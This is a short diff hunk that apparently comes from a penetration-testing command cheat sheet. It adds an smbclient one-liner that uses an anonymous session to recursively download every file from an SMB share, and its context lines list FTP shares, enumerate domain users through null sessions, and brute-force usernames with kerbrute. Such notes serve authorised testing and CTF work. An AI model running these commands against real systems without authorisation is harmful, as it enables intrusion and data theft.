@@ -165,6 +165,7 @@ nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls
 wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -np -nH -m -q -P ftp
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
 smbme $TARGET
+mkdir smb; smbclient //$TARGET/SHARENAME -N -D . -c 'lcd smb; recurse; prompt; mget *'
 impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]'
 rpcclient -U "" -N $TARGET -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]'
 (kerbrute userenum --dc $TARGET -d $DOM /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --delay 0 -o $TARGET_userenum.kerbrute &)
